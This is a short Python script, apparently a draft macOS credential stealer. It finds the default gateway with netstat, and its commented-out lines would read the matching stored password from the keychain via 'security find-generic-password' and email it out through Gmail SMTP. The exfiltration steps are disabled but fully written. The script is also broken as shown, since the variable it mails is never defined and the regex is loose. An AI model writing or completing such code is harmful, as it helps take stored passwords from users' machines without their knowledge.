import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netstat -nr | grep default"
networks = subprocess.check_output(command, shell=True)
router_name = re.findall("(?:default\s*)(\d\d.\d.\d.\d\d\d)", networks)

for router in router_name:
    print(router)
    #command = "security find-generic-password -ga " + router
    #result = subprocess.check_output(command, shell=True)


#send_mail("email@gmail.com", "1234", result)
